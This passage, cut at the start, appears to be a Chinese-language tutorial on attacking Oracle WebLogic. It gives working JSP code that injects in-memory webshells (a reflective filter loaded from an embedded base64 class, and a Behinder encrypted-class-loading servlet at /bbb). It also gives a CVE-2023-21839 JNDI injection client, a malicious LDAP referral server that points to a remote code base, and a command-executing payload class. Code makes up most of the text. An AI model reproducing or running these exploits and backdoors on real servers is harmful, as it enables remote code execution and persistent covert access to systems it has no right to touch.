AAoAAgAAABAACAARACQAAAAWAAIAAAAJACUAJgAAAAAACQApACoAAQArAAAABAABACwAAQAtAC4AAgAiAAABXgADAAkAAACGsgACEgW2AAQrwAAGOgQZBBIHuQAIAgDGAGa7AAlZEgq3AAs6BRkFGQQSB7kACAIAtgAMV7gADRkFtgAOtgAPtgAQOga7ABFZGQa3ABISE7YAFDoHGQe2ABWZAAsZB7YAFqcABRIXOggsuQAYAQAZCLYAGSy5ABgBALYAGrEtKyy5ABsDALEAAAADACMAAAA2AA0AAAAVAAgAFwAOABgAGgAZACUAGgA0ABsARAAcAFQAHQBoAB4AcwAfAHwAIAB9ACMAhQAkACQAAABcAAkAJQBYAC8AMAAFAEQAOQAxADIABgBUACkAMwA0AAcAaAAVADUANgAIAAAAhgAlACYAAAAAAIYANwA4AAEAAACGADkAOgACAAAAhgA7ADwAAwAOAHgAPQA+AAQAPwAAACgAA/8AZAAIBwBABwBBBwBCBwBDBwBEBwBFBwBGBwBHAABBBwBI+AAWACsAAAAGAAIASQAsAAEASgAhAAEAIgAAADcAAgABAAAACbIAAhIctgAEsQAAAAIAIwAAAAoAAgAAACgACAApACQAAAAMAAEAAAAJACUAJgAAAAEASwAAAAIATA==";
    byte[] decode_class = new BASE64Decoder().decodeBuffer(encode_class);
    Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
    defineClass.setAccessible(true);
    Class filter_class = (Class) defineClass.invoke(webAppServletContext.getClassLoader(), decode_class, 0, decode_class.length);
    Field classLoader = webAppServletContext.getClass().getDeclaredField("classLoader");
    classLoader.setAccessible(true);
    ClassLoader  classLoader1  =(ClassLoader)classLoader.get(webAppServletContext);

    Field cachedClasses = classLoader1.getClass().getDeclaredField("cachedClasses");
    cachedClasses.setAccessible(true);
    Object cachedClasses_map = cachedClasses.get(classLoader1);
    Method get = cachedClasses_map.getClass().getDeclaredMethod("get", Object.class);
    get.setAccessible(true);
    if (get.invoke(cachedClasses_map, "cmdFilter") == null) {

    Method put = cachedClasses_map.getClass().getMethod("put", Object.class, Object.class);
    put.setAccessible(true);
    put.invoke(cachedClasses_map, "cmdFilter", filter_class);

    Field filterManager = webAppServletContext.getClass().getDeclaredField("filterManager");
    filterManager.setAccessible(true);
    Object o = filterManager.get(webAppServletContext);

    Method registerFilter = o.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
    registerFilter.setAccessible(true);
    registerFilter.invoke(o, "test", "cmdFilter", new String[]{"/*"}, null, null, null);


    response.getWriter().write("done!!!");
    }

    } catch (NoSuchFieldException e) {
    e.printStackTrace();
    } catch (ClassNotFoundException e) {
    e.printStackTrace();
    } catch (IllegalAccessException e) {
    e.printStackTrace();
    } catch (NoSuchMethodException e) {
    e.printStackTrace();
    } catch (InvocationTargetException e) {
    e.printStackTrace();
    }

%>

```

访问JSP页面，让服务器执行恶意代码：

![image-20230629182733225](./images/5.png)

发送命令，可返回执行结果：

![image-20230629182545134](./images/6.png)

## weblogic通过反序列化漏洞注入冰蝎内存马

### 分析

将内存马和冰蝎结合，只需要将冰蝎代码写入web组件中的相应方法中，如注册Servlet类型的内存马，则将冰蝎代码写入service方法或者doPost方法中，Filter类型的内存马，则写入doFilter方法中，由于原本的冰蝎代码是JSP代码，改写为Java代码的时候需要做少量修改

内存马运行时是作为一个java web组件注入到java web项目中，这个java web项目可能有包含多个servlet、filter、listener组件，而内存马通过反射注册为其中的某个组件在java web项目中运行，所以注入内存马的前提应该是已经有java web项目在服务器上运行，然后通过java web项目本身的反序列化漏洞或者文件上传漏洞让服务器执行java代码来注入内存马

但是weblogic自身的漏洞很难做到直接注册内存马，因为weblogic实际上是web中间件，通过weblogic自身的漏洞，如jndi注入或者反序列化漏洞可以做到远程命令执行，如在windows上执行calc命令运行计算器，或在linux上执行反向连接netcat让攻击机获取shell，但是无法直接获取当前部署的web应用程序状态，所以无法直接注入内存马（如果可以获取当前部署的web应用程序状态，那么可以通过netcat上传本地的Jsp恶意代码到服务器相应目录）

### web应用程序存在文件上传漏洞时

上传注册内存马的JSP脚本，该访问脚本即可注入冰蝎内存马，注册内存马JSP脚本为：

```java
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page import="weblogic.servlet.internal.WebAppServletContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="weblogic.servlet.utils.ServletMapping" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="weblogic.servlet.internal.ServletStubImpl" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.security.NoSuchAlgorithmException" %>
<%@ page import="javax.crypto.NoSuchPaddingException" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.security.InvalidKeyException" %>
<%@ page import="javax.crypto.IllegalBlockSizeException" %>
<%@ page import="javax.crypto.BadPaddingException" %>
<%--
  Created by IntelliJ IDEA.
  User: Jack
  Date: 2023/7/2
  Time: 1:00
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%



  // 创建servlet
  HttpServlet httpServlet = new HttpServlet() {
    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
      class U extends ClassLoader{
        U(ClassLoader c){
          super(c);
        }
        public Class g(byte []b){
          return super.defineClass(b,0,b.length);
        }
      }


      String k = "e45e329feb5d925b";
      HttpSession session = req.getSession();
      session.setAttribute("u", k);
      Cipher c = null;
      try {
        c = Cipher.getInstance("AES");
      } catch (NoSuchAlgorithmException e) {
        e.printStackTrace();
      } catch (NoSuchPaddingException e) {
        e.printStackTrace();
      }
      try {
        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
      } catch (InvalidKeyException e) {
        e.printStackTrace();
      }
      javax.servlet.jsp.PageContext pageContext = javax.servlet.jsp.JspFactory.getDefaultFactory().getPageContext(this, req, resp, null, true, 8192, true);
      try {
        new U(this.getClass().getClassLoader()).g(
                c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(req.getReader().readLine()))).newInstance().equals(pageContext);
      } catch (InstantiationException e) {
        e.printStackTrace();
      } catch (IllegalAccessException e) {
        e.printStackTrace();
      } catch (IllegalBlockSizeException e) {
        e.printStackTrace();
      } catch (BadPaddingException e) {
        e.printStackTrace();
      }
    }
  };

  String URI = "/bbb";
// 获取servletContext
  weblogic.servlet.internal.WebAppServletContext servletContext = (WebAppServletContext) request.getServletContext();

  try {
    // 获取servletMapping
    Method getServletMapping = servletContext.getClass().getDeclaredMethod("getServletMapping");
    getServletMapping.setAccessible(true);
    ServletMapping mappings = (ServletMapping) getServletMapping.invoke(servletContext);

    // 使用ServletStub包装HttpServlet
    Constructor<?> ServletStubImplConstructor = Class.forName("weblogic.servlet.internal.ServletStubImpl").getDeclaredConstructor(String.class, Servlet.class, WebAppServletContext.class);
    ServletStubImplConstructor.setAccessible(true);
    ServletStubImpl servletStub = (ServletStubImpl) ServletStubImplConstructor.newInstance(URI, httpServlet, servletContext);

    // 使用URLMathchHelper包装ServletStub
    Constructor<?> URLMatchHelperConstructor = Class.forName("weblogic.servlet.internal.URLMatchHelper").getDeclaredConstructor(String.class, ServletStubImpl.class);
    URLMatchHelperConstructor.setAccessible(true);
    Object umh = URLMatchHelperConstructor.newInstance(URI, servletStub);

    // 添加到ServletMapping中，即代表注入servlet内存马成功
    if (mappings.get(URI) == null){
      mappings.put(URI, umh);
    }

    response.getWriter().write("\n this page inject the Servlet type memshell, it can be accessed with /weblogic_pro/bbb with behinder. It works on 12.2.3.0 version.");

  } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException | ClassNotFoundException | InstantiationException e) {
    e.printStackTrace();
  }
%>
```

注入成功

![image-20230703163215119](.\images\image-20230703163215119.png)

使用冰蝎连接

![image-20230703163413176](.\images\image-20230703163413176.png)



### weblogic通过JNDI注入实现任意代码执行

通过cve-2023-21839的JNDI注入，可以通过启动ldap服务加载恶意类，而恶意类初始化时可以执行任意恶意代码，在jdk 8u191之后，基于ldap的JNDI远程加载被默认关闭，但是在服务器使用高版本jdk，客户端使用低版本jdk时，仍然可以产生JNDI注入

客户端恶意代码，绑定远程对象：

```java
import org.apache.commons.lang.RandomStringUtils;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class BindRce {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    //iiop
    //iiop
    public static void main(String args[]) throws Exception {
        InitialContext c=getInitialContext("t3://127.0.0.1:7001");
        Hashtable<String,String> env = new Hashtable<String,String>();

        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        weblogic.deployment.jms.ForeignOpaqueReference f=new weblogic.deployment.jms.ForeignOpaqueReference();
        Field jndiEnvironment=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
        jndiEnvironment.setAccessible(true);
        jndiEnvironment.set(f,env);
        Field remoteJNDIName=weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
        remoteJNDIName.setAccessible(true);
//        remoteJNDIName.set(f,"ldap://192.168.8.102:9999/Basic/Command/calc");
        remoteJNDIName.set(f,"ldap://192.168.8.102:7777/test");

        String RandomName=RandomStringUtils.random(5, new char[]{'a','b','c','d','e','f', '1', '2', '3'});
        c.bind(RandomName,f);
        c.lookup(RandomName);    }

}


```

启动ldap服务，并对请求进行转发：

```java
package JNDI;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class ldapServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://127.0.0.1:8080/#test"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}

```

编写恶意类，然后编译并放入http服务器，通过python 启动http服务，python -m http.server 8080：

```java
public class test{
    public test() throws Exception{
        Runtime.getRuntime().exec("calc");
    }
}
```

执行客户端代码后，弹出计算器

![image-20230703170238221](.\images\image-20230703170238221.png)

在知道web项目的位置的前提下，可以通过上传JSP文件并执行的方式来注入内存马
